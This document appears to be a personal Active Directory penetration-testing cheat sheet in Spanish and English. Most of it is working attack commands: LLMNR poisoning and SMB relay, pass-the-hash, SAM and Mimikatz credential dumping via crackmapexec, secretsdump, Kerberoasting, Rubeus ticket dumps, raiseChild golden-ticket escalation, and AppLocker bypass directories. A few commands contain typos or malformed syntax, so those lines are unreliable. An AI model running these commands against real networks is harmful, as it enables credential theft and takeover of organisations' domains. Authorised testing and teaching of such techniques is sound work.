# Notes Active Directory Pentest
@far00t01

## Discovery 
### fping for a list of available hosts:

`fping -a -g 10.10.10.0/24 2>/dev/null | tee alive_hosts.txt`

### Subnet host with Remote Desktop Protocol (RDP) enabled:
`nmap -Pn -vv -p3389 -iL alive_hosts.txt -oN output_host_3389.txt`

### RDP connection

Hash

`sudo xfreerdp /u:administrator /pth:3542d79d5d17bc9d3014d4d56b5e3060 /v:10.10.10.100`

## Relay Attacks en Active Directory

### LLMNR Poisoning
Link-Local Multicast Name Resolution (LLMNR) es un protocolo de resolución DNS que no requiere un servidor DNS. LLMNR intenta resolver una solicitud DNS que DNS no pudo cumplir. El envenenamiento de LLMNR proporcionará el hash NTLMv2, que se puede utilizar para descifrar utilizando una herramienta de descifrado de hash como Hashcat o John the Ripper. 

En primer lugar, se requiere que todos los servicios están activados con Responder.

`sudo nano /etc/responder/Responder.conf`

`sudo responder -I eth0 -dwv`

`hashcat -m 5600 <ntlmv2 hash file> <password list>`
(-m 5600 is the option from Hashcat to crack NTLMv2 hashes.)


### SMB Relay Attack
An SMB relay attack consists of an attacker capturing a user's NTLM hash and relaying it to another machine on the network. He impersonates the user and authenticates against SMB to gain shell or file access.

### Generate a list of relayable hosts (SMB Signing disabled)

`crackmapexec smb 10.10.10.0/24 --gen-relay-list output.txt`

`sudo nano /etc/responder/Responder.conf`

Change the SMB and HTTP parameters to "off" and save the file.

`sudo responder -I eth0 -dwv`

Now run ntlmrelayx.py to relay the hash.

`ntlmrelayx.py -tf output.txt -smb2support`


### Check Null Sessions

`smbclient -L \\\\10.10.10.100`

`smbmap -H 10.10.10.100`

`enum4linux -U 10.10.10.100`

`rpcclient -U "" -N 10.10.10.100`

### Anonymous LDAP:

`ldapsearch -h 10.10.10.100 389 -x -s base -b ‘’ “(objectClass=*)” “*” +`


### BloodHound installation
https://www.kali.org/tools/bloodhound/


### Enumeration Active Directory (Automatic) without credentials
LinWinPwn es un script bash que automatiza una serie de comprobaciones de Enumeración y Vulnerabilidad de Active Directory. El script utiliza una serie de herramientas y sirve como envoltorio de las mismas. Las herramientas incluyen: impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound, y otras.

Clonamos el repositorio de LinWinPwn: 

`git clone https://github.com/lefayjey/linWinPwn`

Damos los permisos necesarios e instalamos. 

`cd linWinPwn; chmod +x linWinPwn.sh`

`chmod +x install.sh`

`./install.sh`

Opciones de uso: 

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com`



# Enumeracion de Active Directory con credenciales.

ldapdomaindump es una herramienta que pretende resolver este problema, recopilando y analizando la información disponible a través de LDAP y mostrándola en un formato HTML legible por humanos, así como en archivos json y csv/tsv/greppable legibles por máquinas.
La herramienta fue diseñada con los siguientes objetivos en mente:

La herramienta genera varios archivos que contienen una visión general de los objetos del dominio:

* domain_groups: Lista de grupos del dominio

* domain_users: Lista de usuarios del dominio

* domain_computers: Lista de cuentas de ordenador en el dominio

* domain_policy: Política de dominio, como requisitos de contraseña y política de bloqueo

* domain_trusts: Confianzas de dominio entrantes y salientes, y sus propiedades

Además de dos archivos agrupados:

* domain_users_by_group: Usuarios del dominio por grupo al que pertenecen

* domain_computers_by_os: Ordenación de los ordenadores del dominio por sistema operativo

### Tool installation: 

Clone the repository:
`git clone https://github.com/dirkjanm/ldapdomaindump`

We execute by entering the credentials of our user + ip of the domain controller. 

`python3 ldapdomaindump.py --user "domain\user" -p 'password' ldap://10.10.10.100:389 --no-json --no-grep -o output`

### Enumeration Ldapsearch autenticated

`ldapsearch -x -H ldap://10.10.10.100 -D 'domain@domain.com' -w 'password' -b "DC=domain,DC=com"`

### Enumeracion de Active Directory de forma automatica

Clone the LinWinPwn repository: 

`git clone https://github.com/lefayjey/linWinPwn`

We give the necessary permissions and install. 

`cd linWinPwn; chmod +x linWinPwn.sh`

`chmod +x install.sh`

`./install.sh`

Usage options: 

Credentialed use

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u testing -p servicess -M user`

Use with Hash authentication

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u Administrator -p :3432e23aa4bc545.... -M pwd_dump`


### Administrator permissions are required:

## Dump local SAM hashes

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth --sam`


### Mimikatz module

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts`

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz`

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' -M mimikazt`

`crackmapexec smb 10.10.10.100 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'`

`crackmapexec 10.10.10.100 -u 'Administrator' -p 'PASSWORD' --local-auth --shares`


### Enumerating Applocker Rules

Policy Applocker
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

Esto debería mostrar los directorios permitidos donde podemos ejecutar nuestros propios binarios

`PS C:\Tools> (Get-AppLockerPolicy -Local).RuleCollections`

`PS C:\Tools> Get-AppLockerPolicy -Local -Effective -Xml | Set-Content ('C:\users\public\applockerpolicy.xml')`

Si AppLocker fue configurado con reglas por defecto, este directorio está en la lista blanca por defecto:

C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\Tasks
C:\windows\tracing


# Pass the Hash Attack
`$ crackmapexec smb <domain IPv4 IP address>/24 -u <SAM account name> -d <domain name>.local -H <NTLM hash>`

`$ crackmapexec smb <local IPv4 address>/24 -u <username> -H <NTLM hash> — local-auth`

Now run ntlmrelayx.py to relay the credentials, dump domain information, and create a new domain user.
`ntlmrelayx.py -6 -t ldaps://<domain controller IPv4 address> -wh fakewpad.<domain name>.local -l <name folder for domain information dumping>`

`secretsdump.py <domain name>/<mitm6 added user>@<domain controller IPv4 address>`


# Kerberoasting 
Obtain Ticket Hash: 

`GetUserSPNs.py domain.com/user:password -outputfile hashes.kerberoast`

`GetNPUsers.py contoso.com/john.doe -no-pass`


### Extracting tickets from rubeus dump 

`https://github.com/curi0usJack/rubeus2ccache`

### Run rubeus to dump tickets

`rubeus dump /service:krbtgt > output.txt`

### Extract

`python3 rubeus2ccache.py -i output.txt`


## RaiseChild
This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids.

`python raiseChild.py childDomain.net/adminuser`

`python raiseChild.py childDomain.net/adminuser:mypwd`

`python raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser`

### This will save the final goldenTicket generated in the ccache target file

`python raiseChild.py -w ccache childDomain.net/adminuser`


# Lateral Movement With PsExec
PsExec is a lightweight telnet replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec’s most powerful uses include launching interactive command prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.

`./PsExec64.exe \\<TARGET-IP> -u Administrator -p <PASSWORD> ipconfig`


# Information NTML 
NTLM vs NTLMv1/v2 vs Net-NTLMv1/v2 

NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing. However, NTLM (without v1/v2) means something completely different.

NTLM hashes are stored in the SAM or NTDS database.
It is LMHASH:NTHASH

### Net-NTLM hashes are used for network authentication

You CAN perform Pass-The-Hash attacks with NTLM hashes
You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes

Referencias interesantes:

https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/
https://learn.microsoft.com/es-es/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties


